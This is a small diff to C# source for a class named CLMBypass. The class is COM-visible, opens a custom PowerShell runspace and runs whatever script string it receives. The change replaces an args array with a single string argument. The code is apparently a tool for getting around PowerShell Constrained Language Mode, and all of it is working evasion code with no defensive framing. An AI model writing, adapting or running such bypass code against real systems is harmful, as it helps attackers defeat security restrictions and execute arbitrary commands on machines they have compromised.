@@ -10,7 +10,7 @@ namespace CLMBypass
     [ComVisible(true)]
     public class CLMBypass
     {
-        public void Main(string[] args)
+        public void Main(string arg)
         {
             System.Management.Automation.Runspaces.Runspace run = System.Management.Automation.Runspaces.RunspaceFactory.CreateRunspace();
             run.Open();
@@ -18,8 +18,7 @@ namespace CLMBypass
             System.Management.Automation.PowerShell shell = System.Management.Automation.PowerShell.Create();
             shell.Runspace = run;
 
-            String exec = args[0];
-            shell.AddScript(exec);
+            shell.AddScript(arg);
             shell.Invoke();
 
             run.Close();
